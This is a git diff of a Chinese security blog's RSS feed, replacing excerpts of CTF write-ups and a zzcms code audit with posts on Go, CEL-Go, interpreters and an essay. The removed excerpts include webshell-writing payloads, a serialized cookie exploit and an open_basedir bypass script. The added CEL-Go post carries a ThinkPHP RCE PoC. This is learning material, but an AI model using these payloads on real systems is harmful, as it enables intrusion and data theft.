@@ -7,153 +7,177 @@
     <generator>Hugo -- gohugo.io</generator>
     <language>zh-cn</language>
     <copyright>This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.</copyright>
-    <lastBuildDate>Wed, 19 May 2021 19:25:18 +0800</lastBuildDate><atom:link href="https://theoyu.top/index.xml" rel="self" type="application/rss+xml" />
+    <lastBuildDate>Thu, 02 Dec 2021 23:30:20 +0800</lastBuildDate><atom:link href="https://theoyu.top/index.xml" rel="self" type="application/rss+xml" />
     <item>
-      <title>zzcms code Audit</title>
-      <link>https://theoyu.top/posts/codeaudit/zzcms/</link>
-      <pubDate>Wed, 19 May 2021 19:25:18 +0800</pubDate>
+      <title>go并发的几个问题</title>
+      <link>https://theoyu.top/posts/concurrent-in-go/</link>
+      <pubDate>Thu, 02 Dec 2021 23:30:20 +0800</pubDate>
       
-      <guid>https://theoyu.top/posts/codeaudit/zzcms/</guid>
-      <description>准备工作 虽然事先准备审这个cms,但是找源码还是花了不少时间，官网只有最新的版本，这里如果大家想要复现就直接下载这里的就好了。
-为了模拟真实环境，我们在phpstudy上配置一下站点,并修改hosts文件即可开始动手啦。
-0x01 sql注入 进入界面,就有一个很明显的搜索框,我们尝试1&#39; or 1=1 #
-发现单引号被转义，search.php包含了/inc/conn.php,而后者又包含了inc/stopsqlin.php，对应代码:
-可以看到这里会对我们POST,GET以及COOKIE中的数据进行转义,那如果想要继续进行下去我们要么就是找到没有包含 /inc/conn.php的组件，要么就是找到拼接sql语句的地方。
-user/check.php是对我们身份进行验证的文件，如果cookie设置有username和password，就会执行一次sql查询,并且该文件奇幻的是没有包含上面说的过滤文件，还自己写了一个过滤函数，还只对username进行过滤,那么我们尝试一下password处。
-不过这个路由设有对验证码的识别，而user/index.php包含了该函数,那我们可以直接在index.php测试。
-那么这里也理所当然可以通过盲注拿数据,不过我在本地搭建的环境比较慢，平均延迟在4秒左右，就没有跑了，师傅们见谅。
-比较遗憾的是管理员路由设置的为session参数验证，无法通过万能密码的方法登陆。
-0x02 任意文件删除 在user/adv.php处，
-不得不说这种对$_REQUEST没有限制的代码真的很恐怖,逻辑其实很简单只要$action等于modify和$img不等于$oldimg即可，并且这里没有对$oldimg过滤导致我们可以直接把../../admin/admin.php删除。
-0x03 网站重装 在Install目录下，step1.php会首先判断是否存在install.lock文件，但是在step2.php及之后的文件都没有对其进行判断,并且step可控。
-0x04 任意密码修改 漏洞点在one/getpassword.php
-elseif($action==&amp;#34;step3&amp;#34; &amp;amp;&amp;amp; @$_SESSION[&amp;#39;username&amp;#39;]!=&amp;#39;&amp;#39;){ $passwordtrue = isset($_POST[&amp;#39;password&amp;#39;])?$_POST[&amp;#39;password&amp;#39;]:&amp;#34;&amp;#34;; $password=md5(trim($passwordtrue)); query(&amp;#34;update zzcms_user set password=&amp;#39;$password&amp;#39;,passwordtrue=&amp;#39;$passwordtrue&amp;#39; where username=&amp;#39;&amp;#34;.@$_SESSION[&amp;#39;username&amp;#39;].&amp;#34;&amp;#39;&amp;#34;); 利用样式和网址重装有些相似，也是POSTaction到step3直接修改密码,但这里需要我们知道被修改用户的$_SESSION[&#39;username&#39;],而在step1中我们可以看到：
-if ($action==&amp;#34;step1&amp;#34;){ $username = isset($_POST[&amp;#39;username&amp;#39;])?$_POST[&amp;#39;username&amp;#39;]:&amp;#34;&amp;#34;; $_SESSION[&amp;#39;username&amp;#39;]=$username; ...... $_SESSION[&#39;username&#39;]有一个被我们赋值的过程，那我们只需先在step1中输入需要修改的username获取session，就可直接跳到step3修改密码。步骤如下：
-然后直接修改密码,把action改为step3即可。
-0x05 反射型xss 在inc/top.php处没有包含inc/conn.php，我们只需要将标签闭合即可实现反射型xss。
-事实上admin用户的后台管理基本上没有什么过滤，存在很多存储型xss,但归于业务原因, 拿到admin权限也就不在乎这个级别漏洞了,感兴趣的师傅可以自行复现。
-0x06 上传webshell 在uploadimg_form.php可以文件上传，不过这个路由非常突兀让我有了一种好像做ctf题的感觉..
-回到正题,我们看看后端是怎么处理我们的文件的:uploadimg.php
-function upfile() { //是否存在文件 if (!is_uploaded_file(@$this-&amp;gt;fileName[tmp_name])){ echo &amp;#34;&amp;lt;script&amp;gt;alert(&amp;#39;请点击“浏览”，先选择您要上传的文件！\\n\\n支持的图片类型为：jpg,gif,png,bmp&amp;#39;);parent.window.close();&amp;lt;/script&amp;gt;&amp;#34;; exit; } //检查文件大小 if ($this-&amp;gt;max_file_size*1024 &amp;lt; $this-&amp;gt;fileName[&amp;#34;size&amp;#34;]){ echo &amp;#34;&amp;lt;script&amp;gt;alert(&amp;#39;文件大小超过了限制！最大只能上传 &amp;#34;.</description>
+      <guid>https://theoyu.top/posts/concurrent-in-go/</guid>
+      <description>前言 作为世界上除了PHP之外最好的语言golang，只需go关键字修饰函数，就可以直接启动一个goroutine(协程)运行，但在实际的场景中，我们需要考虑到协程的数量，其之间的同步与通信，以及精确控制其结束。
+如何控制协程的通信 引入全局变量 这是最简单也是最容易想到的方法：虽然goroutine的退出只能由其自身的决定，不允许从外部直接控制，不过我们可以通过引入全局变量，所有的goroutine都共享这个变量，并且不断寻查其是否更新，在主程序中对其更改，goroutine勘测到其变化后做出反应。
+package main import ( &amp;#34;fmt&amp;#34; &amp;#34;time&amp;#34; ) var running bool func run() { for running { fmt.Println(&amp;#34;running&amp;#34;) time.Sleep(500*time.Millisecond) } fmt.Println(&amp;#34;stop now&amp;#34;) } func main(){ running=true go run() go run() time.Sleep(time.Second) running=false time.Sleep(time.Second) } /* out: running running running running stop now stop now */ 这种写法看似很简单，但是还是有好几个问题：
+ 全局变量存在数据同步问题，如果有多个写入需要加锁处理。 协程之间的通信量很小，只有事先定义的全局变量，并且只能单向从主程序通知给协程。  利用channel通信 相信写go的兄弟，一定对这一句话不陌生：
+ Go语言的并发模型是CSP（Communicating Sequential Processes）通信顺序进程，提倡通过通信共享内存而不是通过共享内存而实现通信。
+ 这里简单谈谈我的理解:
+共享内存是什么?如果在一个系统中，不同进程或者线程共享一块内存，那么他们之间不需要进行平凡的交互，如果有大量的数据传输，也省去了数据拷贝的消耗。
+但是这有一个很大的问题，就是多线程下，共享一块内存，肯定会存在数据冲突。为了对抗这种冲突，人们发明了很多机制，比如加锁，信号量，各种调度算法等等，但是这毫无都会对并发的性能造成影响。(但并不是说全部都不行，比如深度 | 字节跳动微服务架构体系演进）
+最终“通过通信来实现进程/线程间交互”的方案脱颖而出,go就在语言层提供了channel来实现这一方案，简单理解就是设计的时候，对于消息队列，只提供读写接口，而对于内部的实现你完全不用去在意，看起来消息队列就像是共享内存一样了。然而你的消息队列可以利用socket进行通信。
+通过看channel的源码，可以看出它其实就是一个队列加一个轻量锁
+type hchan struct { qcount uint // total data in the queue  dataqsiz uint // size of the circular queue  buf unsafe.</description>
     </item>
     
     <item>
-      <title>2021 WP汇总</title>
-      <link>https://theoyu.top/posts/2021/</link>
-      <pubDate>Mon, 17 May 2021 20:24:32 +0800</pubDate>
+      <title>Preliminary Study on CEL-Go</title>
+      <link>https://theoyu.top/posts/cel-go/</link>
+      <pubDate>Tue, 26 Oct 2021 23:24:32 +0800</pubDate>
       
-      <guid>https://theoyu.top/posts/2021/</guid>
-      <description>0x01 NEPCTF 周末比较忙，做了两道题。
-little_trick &amp;lt;?php error_reporting(0); highlight_file(__FILE__); $nep = $_GET[&amp;#39;nep&amp;#39;]; $len = $_GET[&amp;#39;len&amp;#39;]; if(intval($len)&amp;lt;8 &amp;amp;&amp;amp; strlen($nep)&amp;lt;13){ eval(substr($nep,0,$len)); }else{ die(&amp;#39;too long!&amp;#39;); } ?&amp;gt;关于len这个点还挺好说的，-1就绕了，那么题目就变成了限制长度为12的命令执行。方法还挺多的。
-solution 1 hitcon之前做了限制长度4或5的命令执行,4和5都可以了，那12自然不在话下，这里就不过多阐述了。
-solution 2 事实上这题没那么麻烦，因为我们可控制字符还是比较长的，我们先测试一下:
-?nep=`ls&amp;gt;z`;&amp;amp;len=7访问一下z我们发现了
-index.phpnep.phpz很明显flag就在nep.php里，那只需
-&amp;gt;cat *&amp;gt;z再访问z即可。
-solution3 ?nep=`$_GET[a]`;1&amp;amp;len=-1&amp;amp;a=echo &amp;quot;&amp;lt;?php eval(\$_POST[theoyu]);&amp;quot;&amp;gt;theoyu.phpsolution4 这个是看一位老哥的wp时发现的，确实巧妙。 首先鉴于php的弱类型，intval会把字符串数字后给截断，导致比如7;agawg识别为7，然后里用?nep=$len达到内联执行的效果。
-?nep=`$len`;&amp;amp;len=7;echo &amp;quot;&amp;lt;?php @eval(\$_POST[theoyu])?&amp;gt;&amp;quot; &amp;gt; theoyu.php梦里花开牡丹亭  考察php原生类的利用
- 源码：
-&amp;lt;?php highlight_file(__FILE__); error_reporting(0); include(&amp;#39;shell.php&amp;#39;); class Game{ public $username; public $password; public $choice; public $register; public $file; public $filename; public $content; public function __construct() { $this-&amp;gt;username=&amp;#39;user&amp;#39;; $this-&amp;gt;password=&amp;#39;user&amp;#39;; } public function __wakeup(){ if(md5($this-&amp;gt;register)===&amp;#34;21232f297a57a5a743894a0e4a801fc3&amp;#34;){ $this-&amp;gt;choice=new login($this-&amp;gt;file,$this-&amp;gt;filename,$this-&amp;gt;content); }else{ $this-&amp;gt;choice = new register(); } } public function __destruct() { $this-&amp;gt;choice-&amp;gt;checking($this-&amp;gt;username,$this-&amp;gt;password); } } class login{ public $file; public $filename; public $content; public function __construct($file,$filename,$content) { $this-&amp;gt;file=$file; $this-&amp;gt;filename=$filename; $this-&amp;gt;content=$content; } public function checking($username,$password) { if($username===&amp;#39;admin&amp;#39;&amp;amp;&amp;amp;$password===&amp;#39;admin&amp;#39;){ $this-&amp;gt;file-&amp;gt;open($this-&amp;gt;filename,$this-&amp;gt;content); die(&amp;#39;login success you can to open shell file!</description>
+      <guid>https://theoyu.top/posts/cel-go/</guid>
+      <description>前言 XRAY很牛逼，但是其并不开源，最近也是想写点东西，就自己也造个轮子，有时间的话就把Thinkphp，structs2，weblogic都整上了。
+poc的话当然希望可以直接融合XRAY的poc，采用YAML格式，但有一个问题，比如我们一般用gopkg.in/yaml.v2把YAML解析为结构体，但如果YAML中出现一些表达式，就很难直接用结构体解决。(无脑正则当然ok)
+name:poc-yaml-thinkphp5023-method-rcerules:- method:POSTpath:/index.php?s=captchaheaders:Content-Type:application/x-www-form-urlencodedbody:|_method=__construct&amp;amp;filter[]=printf&amp;amp;method=GET&amp;amp;server[REQUEST_METHOD]=TmlnaHQgZ2F0aGVycywgYW5%25%25kIG5vdyBteSB3YXRjaCBiZWdpbnMu&amp;amp;get[]=1expression:|response.status==200&amp;amp;&amp;amp;response.body.bcontains(b&amp;#34;TmlnaHQgZ2F0aGVycywgYW5%kIG5vdyBteSB3YXRjaCBiZWdpbnMu1&amp;#34;)detail:links:- https://github.com/vulhub/vulhub/tree/master/thinkphp/5.0.23-rce上面的expression其实很好理解，长得比较像python表达式，在python中eval可以直接对表达式求解，而我们现在也就需要一个高效的方法可以自定义求解表达式。
+在XRAY-如何编写expression表达式中其实有提到一个库 ==&amp;gt; CEL-Go,官网介绍看了半天说实话不知道在干嘛&amp;hellip;查了查国内这方面的教程也几乎为0，不过好在Google大爹的codelabs实在良心，自己也跟着过一遍，算是入了个门，在这简单记录一下。
+Introduction  CEL是为了安全的执行用户代码而设计的一门“语言”，就像用户在Python上盲目调用eval是危险的，但CEL可以安全的执行。
+CEL多用于求解表达式，类似single line functions或者lambda表达式，并且通常用于计算bool值，但它也可用于构造更复杂的对象，如JSON或Protobuf。
+ Key concepts  Variable bindings Function bindings for any custom extensions An AST to evaluate  Declare the variables cel中数据类型是绑定在protobuf上的，所以我们先简单写一个proto文件
+syntax = &amp;#34;proto3&amp;#34;;package celDemo;option go_package = &amp;#34;celDemo/bp&amp;#34;;message Response{ string url = 1; int32 status =2; bytes body = 3;}生成对应go文件 == &amp;gt;protoc --go_out=. celDemo/http.proto
+celDemo ├── bp │ └── http.pb.go ├── cel.go ├── cel_test.go └── http.</description>
     </item>
     
     <item>
-      <title>蓝帽杯 One Pointer PHP</title>
-      <link>https://theoyu.top/posts/bluehat/</link>
-      <pubDate>Tue, 04 May 2021 21:30:20 +0800</pubDate>
+      <title>白帽子讲web安全</title>
+      <link>https://theoyu.top/posts/course/whitehat-and-security/</link>
+      <pubDate>Mon, 25 Oct 2021 10:26:13 +0800</pubDate>
       
-      <guid>https://theoyu.top/posts/bluehat/</guid>
-      <description>两个web，一个js小游戏代码审计1小时，玩10秒弹flag什么鬼，还有一个就是这道全场1解题。
-&amp;lt;?php class User{ public $count; } if($user=unserialize($_COOKIE[&amp;#34;data&amp;#34;])){ $count[++$user-&amp;gt;count]=1; if($count[]=1){ $user-&amp;gt;count+=1; setcookie(&amp;#34;data&amp;#34;,serialize($user)); }else{ eval($_GET[&amp;#34;backdoor&amp;#34;]); } }else{ $user=new User; $user-&amp;gt;count=1; setcookie(&amp;#34;data&amp;#34;,serialize($user)); } ?&amp;gt;题目给了源码，第一关是数组溢出，需要$count[]=1，这一步赋值操作报错即可命令执行，貌似php的溢出长度和操作系统有关，我在本地尝试的时候2^31-1即可绕过，但题目上需要2*63-1，不过关系不大，然后蚁剑连上去即可。
-add_api.php?backdoor=eval($_POST[theoyu])；蚁剑设置Cookiedata=O%3a4%3a&amp;quot;User&amp;quot;%3a1%3a{s%3a5%3a&amp;quot;count&amp;quot;%3bi%3a9223372036854775806%3b}发现只能看当前目录，多半是open_basedir设置了只有当前目录，不过这个好说，p神有文章绕过这个，然后看了一眼phpinfo() &amp;hellip;
-putenv 居然被过滤了！前几天还专门研究了这个，不过在phpinfo() 中发现Server API =FPM/FastCGI ，之前学SSRF 的时候有接触过这个，可以通过这个RCE，但好像根本没有ssrf的入口..思绪在这里就断了
-好像没啥会的了，就尝试读一下配置文件，读取方式如下：
-&amp;lt;?php mkdir(&amp;#39;theoyu&amp;#39;); chdir(&amp;#39;theoyu&amp;#39;); ini_set(&amp;#39;open_basedir&amp;#39;,&amp;#39;..&amp;#39;); chdir(&amp;#39;..&amp;#39;);chdir(&amp;#39;..&amp;#39;);chdir(&amp;#39;..&amp;#39;);chdir(&amp;#39;..&amp;#39;); ini_set(&amp;#39;open_basedir&amp;#39;,&amp;#39;/&amp;#39;); // 此处用来读目录 // $a = new DirectoryIterator(&amp;#34;glob:///etc/nginx/sites-enabled/*&amp;#34;); // foreach($a as $f){ // echo($f-&amp;gt;__toString().&amp;#39;&amp;lt;br&amp;gt;&amp;#39;); // }  //此处用来读文件 echo file_get_contents(&amp;#39;/etc/nginx/sites-enabled/default&amp;#39;); ?&amp;gt;这个读取过程也是很折磨，大概就是一点一点摸索吧，在配置文件发现了fastcgi的开放端口&amp;hellip;然后就不会了&amp;hellip;
-看wp发现师傅们用的是ftp 与 php-fpm 对话 RCE，具体可参考这一篇文章，后续我应该也会专门总结一篇关于fastcgi和fpm的文章。
-那有了ftp的对话，思路就很清晰了，通过本地vps起一个ftp服务，在靶机上将fpmRCE的payload发送给ftp，再又ftp转发给靶机的9001端口形成ssrf，不得不说实在太巧妙了。
-fastcgi 的攻击脚本有php和go的，经过测试都可以运行，在php_value 处把disable_function置空即可。有的师傅也利用了extension去加载**.so**反弹shell，不过我感觉既然蚁剑已经可以连接了，就不需要这一步。</description>
+      <guid>https://theoyu.top/posts/course/whitehat-and-security/</guid>
+      <description>前言 安全工程师的核心竞争力不在于拥有多少个0day，掌握多少种安全技术，而是在于他对安全理解的深度，以及由此引申的看待安全问题的角度和高度。
+站在白帽子的视角，除了剖析攻击原理，更加需要关注如何防范这些漏洞。
+第一章 我的安全世界观 数据从高等级的信任域流向低等级的信任域，是不需要经过安全检查的，反之则需要。
+安全问题的本质是信任的问题。
+安全三要素(CIA)：
+ 机密性(Confidentiality)：数据内容不能泄漏 完整性(Integrity)：数据内容完成，没有被篡改 ==&amp;gt; 数字签名 可用性(Availability)：拒绝服务攻击的是可用性  安全评估：
+1. 资产等级划分 划分信任域和信任边界 互联网安全的核心问题，是数据安全的问题。 2. 威胁分析 威胁建模 书中提到的了TRIDE，不过现在ATT&amp;amp;CK应该更加全面。 3. 风险分析 Risk = Probability * Damage Potential 4. 确定解决方案 有效解决问题 用户体验好 高性能 低耦合 易于拓展和升级 白帽子兵法：
+1. Secure By Default 原则： 使用白名单优于黑名单 最小权限原则 2. 纵深防御原则：在各个不同层次实施安全方案。 3. 数据与代码分离原则 4. 不可预测原则： 有效对抗基于篡改，伪造的攻击。 token防御CSRF。 第二章 浏览器安全 同源策略(Same origin Policy)：
+限制来自不同源的“document”或脚本，对当前“document”读取或设置某些属性。 影响“源”的因素：host、子域名、端口、协议。 页面存放文件的域并不重要，重要的是加载文件所在的域。 &amp;lt;script&amp;gt;、&amp;lt;img&amp;gt;、&amp;lt;iframe&amp;gt;等标签可以跨域加载资源 XMLHttpRequest受同源策略的约束，需要通过目标域返回的HTTP头来授权是否允许跨域访问。
+对浏览器而言，除了DOM、Cookie、XMLHttpRequest受到同源策略的限制，浏览器第三方插件也有自己的同源策略（Flash、Java Applet、Google Gears）
+浏览器沙箱：
+Sandbox的设计的目的是为了让不可信任的代码运行在一定环境中，限制不可信任的代码访问隔离区之外的资源。如果需要跨越Sandbox边界交换数据，只能通过封装的API完成。</description>
     </item>
     
     <item>
-      <title>利用LD_PRELOAD绕过disable_function</title>
-      <link>https://theoyu.top/posts/disabled_function/</link>
-      <pubDate>Mon, 03 May 2021 10:24:32 +0800</pubDate>
+      <title>popMaster</title>
+      <link>https://theoyu.top/posts/popmaster/</link>
+      <pubDate>Sat, 09 Oct 2021 23:30:20 +0800</pubDate>
       
-      <guid>https://theoyu.top/posts/disabled_function/</guid>
-      <description>什么是LD_PRELOAD 在Linux的动态链接库的世界中，LD_PRELOAD是一个环境变量，它可以影响程序的运行时的链接（Runtime linker），允许你定义在程序运行前优先加载的动态链接库。一方面，我们可以以此功能来使用自己的或是更好的函数（无需别人的源码），而另一方面，我们也可以以向别人的程序注入程序，从而达到特定的目的。
-这里我们举行一个密码验证的例子，来初步探究LD_PRELOAD与动态链接的关系。
-/* login.c */ #include &amp;lt;stdio.h&amp;gt;#include&amp;lt;string.h&amp;gt;int main(int argc,char **argv){ char passwd[]=&amp;#34;password&amp;#34;; if(!strcmp(passwd,argv[1])){ printf(&amp;#34;Correct Password!/n&amp;#34;); return 1; } printf(&amp;#34;Invalid Password!/n&amp;#34;); return 0; } 在上面这段程序中，我们使用了strcmp函数来判断两个字符串是否相等。下面，我们使用一个动态函数库来重载strcmp函数：
-/* hack.c */ #include &amp;#34;stdio.h&amp;#34;#include &amp;lt;string.h&amp;gt;int strcmp(const char *s1,const char *s2){ printf(&amp;#34;hacking! s1=%s,s2=%s\n&amp;#34;,s1,s2); // return 0 indicates that 2 strings are equial  return 0 ; } 编译程序：
-☁ c gcc login.c -o login ☁ c gcc -shared hack.c -o hack.so 运行一下:
-☁ c .</description>
+      <guid>https://theoyu.top/posts/popmaster/</guid>
+      <description>强网杯popmaster这题一直耿耿于怀，用正则毕竟不是作者的本意。刚好在看静态分析这块，纯理论实在太难顶，就再重新揣摩揣摩。
+php-parser是一项用PHP编写的PHP解释器，可以把php代码转化为AST，以利于我们静态分析，在回到这道题之前，先简单了解一下php-parser的用法。
+一个简单的例子：
+&amp;lt;?php use PhpParser\Error; use PhpParser\NodeTraverser; use PhpParser\ParserFactory; require &amp;#39;vendor/autoload.php&amp;#39;; $code = &amp;lt;&amp;lt;&amp;lt;&amp;#39;CODE&amp;#39; &amp;lt;?php $a=&amp;#34;theoyu&amp;#34;; echo($a); CODE; //创建解释器实例 $parser = (new ParserFactory)-&amp;gt;create(ParserFactory::PREFER_PHP7); try { $ast = $parser-&amp;gt;parse($code); var_dump($ast); } catch (Error $error) { echo &amp;#34;Parse error: {$error-&amp;gt;getMessage()}\n&amp;#34;; return; } 首先需要创建一个解释器实例，同时需要指明php版本，对源码进行解析，同时通过PhpParser\Error对代码的异常进行捕获。
+array(2) {[0]=&amp;gt;object(PhpParser\Node\Stmt\Expression)#1178 (2) {[&amp;#34;expr&amp;#34;]=&amp;gt;object(PhpParser\Node\Expr\Assign)#1177 (3) {[&amp;#34;var&amp;#34;]=&amp;gt;object(PhpParser\Node\Expr\Variable)#1175 (2) {[&amp;#34;name&amp;#34;]=&amp;gt;string(1) &amp;#34;a&amp;#34;[&amp;#34;attributes&amp;#34;:protected]=&amp;gt;array(2) {[&amp;#34;startLine&amp;#34;]=&amp;gt;int(2)[&amp;#34;endLine&amp;#34;]=&amp;gt;int(2)}}[&amp;#34;expr&amp;#34;]=&amp;gt;object(PhpParser\Node\Scalar\String_)#1176 (2) {[&amp;#34;value&amp;#34;]=&amp;gt;string(6) &amp;#34;theoyu&amp;#34;[&amp;#34;attributes&amp;#34;:protected]=&amp;gt;array(3) {[&amp;#34;startLine&amp;#34;]=&amp;gt;int(2)[&amp;#34;endLine&amp;#34;]=&amp;gt;int(2)[&amp;#34;kind&amp;#34;]=&amp;gt;int(2)}}[&amp;#34;attributes&amp;#34;:protected]=&amp;gt;array(2) {[&amp;#34;startLine&amp;#34;]=&amp;gt;int(2)[&amp;#34;endLine&amp;#34;]=&amp;gt;int(2)}}[&amp;#34;attributes&amp;#34;:protected]=&amp;gt;array(2) {[&amp;#34;startLine&amp;#34;]=&amp;gt;int(2)[&amp;#34;endLine&amp;#34;]=&amp;gt;int(2)}}[1]=&amp;gt;object(PhpParser\Node\Stmt\Echo_)#1180 (2) {[&amp;#34;exprs&amp;#34;]=&amp;gt;array(1) {[0]=&amp;gt;object(PhpParser\Node\Expr\Variable)#1179 (2) {[&amp;#34;name&amp;#34;]=&amp;gt;string(1) &amp;#34;a&amp;#34;[&amp;#34;attributes&amp;#34;:protected]=&amp;gt;array(2) {[&amp;#34;startLine&amp;#34;]=&amp;gt;int(3)[&amp;#34;endLine&amp;#34;]=&amp;gt;int(3)}}}[&amp;#34;attributes&amp;#34;:protected]=&amp;gt;array(2) {[&amp;#34;startLine&amp;#34;]=&amp;gt;int(3)[&amp;#34;endLine&amp;#34;]=&amp;gt;int(3)}}}可以使用NodeDumper更加直观的查看AST
+use PhpParser\NodeDumper; $dumper = new NodeDumper; echo $dumper-&amp;gt;dump($ast) ; array(0:Stmt_Expression(expr:Expr_Assign(var:Expr_Variable(name:a)expr:Scalar_String(value:theoyu)))1:Stmt_Echo(exprs:array(0:Expr_Variable(name:a))))回到源码</description>
     </item>
     
     <item>
-      <title>某群一道反序列化题</title>
-      <link>https://theoyu.top/posts/unserialize1/</link>
-      <pubDate>Sun, 02 May 2021 16:24:32 +0800</pubDate>
+      <title>漫谈解释器</title>
+      <link>https://theoyu.top/posts/talk-about-interpreter/</link>
+      <pubDate>Sun, 19 Sep 2021 22:24:32 +0800</pubDate>
       
-      <guid>https://theoyu.top/posts/unserialize1/</guid>
-      <description>五一忽然就要过了..感觉要学的好没学，考试也没复习，早上12点在某ctf群看到在讨论这道题，就起床做做了&amp;hellip;
- 题目给出源码：
-&amp;lt;?php highlight_file(__FILE__); class main{ public $settings; public $params; public function __construct(){ $this-&amp;gt;settings=array( &amp;#39;display_errors&amp;#39;=&amp;gt;&amp;#39;On&amp;#39;, &amp;#39;allow_url_fopen&amp;#39;=&amp;gt;&amp;#39;On&amp;#39; ); $this-&amp;gt;params=array(); } public function __wakeup(){ foreach ($this-&amp;gt;settings as $key =&amp;gt; $value) { ini_set($key, $value); } } public function __destruct(){ file_put_contents(&amp;#39;settings.inc&amp;#39;, unserialize($this-&amp;gt;params)); } } unserialize($_GET[&amp;#39;data&amp;#39;]); 法一 反序列化回调函数+后缀文件包含 给了源码就好说，在本地测试一下。我们可以对settings.inc文件进行写入，那自然想到的就是写入一句话然后进行文件包含，找一下有没有原生调用函数的方法。
-就在官网手册的unserialize() 处发现了这个函数，官方给出的实例是这样的
-&amp;lt;?php $serialized_object=&amp;#39;O:1:&amp;#34;a&amp;#34;:1:{s:5:&amp;#34;value&amp;#34;;s:3:&amp;#34;100&amp;#34;;}&amp;#39;; // unserialize_callback_func 从 PHP 4.2.0 起可用 ini_set(&amp;#39;unserialize_callback_func&amp;#39;, &amp;#39;mycallback&amp;#39;); // 设置您的回调函数  function mycallback($classname) { // 只需包含含有类定义的文件  // $classname 指出需要的是哪一个类 } ?</description>
+      <guid>https://theoyu.top/posts/talk-about-interpreter/</guid>
+      <description>前言 开个新坑，本来是打算学学编译器的，但是发现基础太薄弱了，就先学习解释器相关吧，刚好大创也需要这一块的知识。
+主要参考以下两本教材
+ 编译器设计 Writing An Interpreter In Go  概述 编译型语言 有的编程语言要求必须提前将所有源代码一次性转换成二进制指令，也就是生成一个可执行程序，比如C、c++、Golang等，这种编程语言称为编译型语言，使用的转换工具称为编译器。
+解释型语言 有的编程语言可以一边执行一边转换，不会生成可执行程序，比如 JavaScript、PHP等。这种编程语言称为解释型语言，使用的转换工具称为解释器。
+编译+解释 严格意义上python不算是单纯的解释型语言，其还会编译为pyc字节码，由pvm解释执行这个字节码文件，每一次负责将一条字节码文件语句翻译成cpu可以直接执行的机器代码。
+java从源代码编译为字节码，然后在JVM上运行字节码执行，JVM是一种字节码的解释器，JVM的实现包括一个运行时的编译器，称为JIT(just-in-time)编译器，其最大的优势在于可以在运行时进行及时优化。更多关于JIT的知识可参考这篇文章.
+在知乎看到一个很有意思的提问：
+ 我之前看知乎上有人分析，编译型语言能够直接生成二进制代码（Windows下就是EXE或DLL吧），而解释型语言不会生成二进制代码，最多道二进制代码的前一步。
+我对这种解释有些无法理解，感觉这似乎不是他们的本质吧。Python是一个解释性语言，但我记得Python可以下载一个包，能够将Python直接编译为EXE可执行程序，难道说，我下载了这个包之后，Python就从解释型语言变为编译型语言了不成？
+是这个概念区分本身就有严重的先天缺陷，还是我的理解本身有错误？
+ 其中无论对与否，比较戳中我的回答：
+ 语言只是规定语法，最后用这语言写出来的代码怎么翻译成机器码，怎么运行，还需要一个实现。这个实现可以是编译器也可以是解释器。
+所以你也可以做一个python的编译器或者C语言的解释器
+ 编译器构成 现在国内外大多教材(虽然我都没看过)在编译器这一块是头重脚轻的，比重前端&amp;raquo;后端&amp;gt;优化器，虽然对于编译器这样非常不合理，不过站在学习静态分析的方向，更多的关注点还是放在前端，当然优化部分也不可忽视，比如这个值得反复揣摩的问答。
+前端 前端部分，其实现有很多工具已经帮我们实现了
+词法分析器 源代码在计算机『眼中』其实是一团乱麻。无法被理解的字符串在计算器看来并没有什么区别，为了理解这些字符我们需要做的第一件事情就是将字符串分组，这能够降低理解字符串的成本，简化源代码的分析过程。所有的编译过程其实都是从解析代码的源文件开始的，词法分析的作用就是解析源代码文件，它将文件中的字符串序列转换成 Token 序列，方便后面的处理和解析，我们一般会把执行词法分析的程序称为词法解析器（lexer）。
+对于词法分析器而言，最繁杂的一步，也就是需要我们把这门语言可能用到的token全部枚举出来
+package token const( // Identifiers + literals 	IDENT = &amp;#34;IDENT&amp;#34; // add, foobar, x, y, ... 	INT = &amp;#34;INT&amp;#34; // 1343456  // Operators 	ASSIGN = &amp;#34;=&amp;#34; PLUS = &amp;#34;+&amp;#34; // Delimiters 	COMMA = &amp;#34;,&amp;#34; SEMICOLON = &amp;#34;;&amp;#34; LPAREN = &amp;#34;(&amp;#34; // Keywords 	FUNCTION = &amp;#34;FUNCTION&amp;#34; LET = &amp;#34;LET&amp;#34; TRUE = &amp;#34;TRUE&amp;#34; .</description>
     </item>
     
     <item>
-      <title>about the blog</title>
-      <link>https://theoyu.top/posts/something/</link>
-      <pubDate>Sat, 01 May 2021 07:01:59 +0800</pubDate>
+      <title>something0x02</title>
+      <link>https://theoyu.top/posts/essay/%E9%9A%8F%E7%AC%940x02/</link>
+      <pubDate>Tue, 17 Aug 2021 23:55:32 +0800</pubDate>
       
-      <guid>https://theoyu.top/posts/something/</guid>
-      <description>删了绝大多数之前博客,有技术性的,有碎碎叨叨的,但更多的是没有什么思考的wp。或许学的越多,看问题的角度越多,就越会对上一个阶段的自己不满意。在我看来之前的记录大多都是记流水帐似的任务,又或许是看了很多师傅的博客，想如果我也能总结出这样的文章，那我是不是也会变得像师傅这样厉害呢?
-转眼就到了大二的尾巴,翻了翻之前大多数的博客,可能我缺少的是大师傅那样静下心来思考的毅力。不可否认web安全就是这样浮躁,东西杂轮子多,不加以思考的用别人的轮子去解决问题很难有所进步。让我感触最深的还是p神和飘零师傅,看他们从底层开始学习,哪怕一个简单细小的地方也可以总结出有深度的内容,这让我很是惭愧。几个月前的我还嚷嚷着我这辈子也不可能学java的,php的意义就是全是漏洞，golang天下第一调打c++，现在看来不过是对自己没有扎实基础的逃避，无论什么东西，存在即意义,或许我现在还不晚,还有足够的时间去捣鼓我喜欢做的事情。
-最后,希望大家与博客战斗的同时,不要忘记——博客的初心是记录。
-   2019-12-23——2020-11-17
-博客园
-  2020-11-17——2021-5-1
-Typecho
-  2021-5-1——Now
-Hugo
-  </description>
+      <guid>https://theoyu.top/posts/essay/%E9%9A%8F%E7%AC%940x02/</guid>
+      <description>还是想还是写点什么，但不知道该怎么下笔。
+对朋友而言，我算是一个倾诉欲望很强的人，不管是开心的事情也好，伤心的也罢。但如果真的记录下来，好像就都会变成比较丧，尽管我认为自己是一个比较乐观的人，我也希望可以给身边的人带来快乐，所以就会变得有些许矛盾。
+实习这几天，晚上睡觉经常一直胡思乱想，为什么我会坚持做一些事情。
+为什么我要写博客，可能刚开始看到了很多师傅，学长都有博客，心想如果我学着写会不会变成像他们这样厉害的人呢？到后来应该是大家都开始记录，有时候看到别人的访问或者评论还会暗暗的开心。
+为什么我要打比赛呢，感觉~~&amp;mdash;&amp;ndash;~~
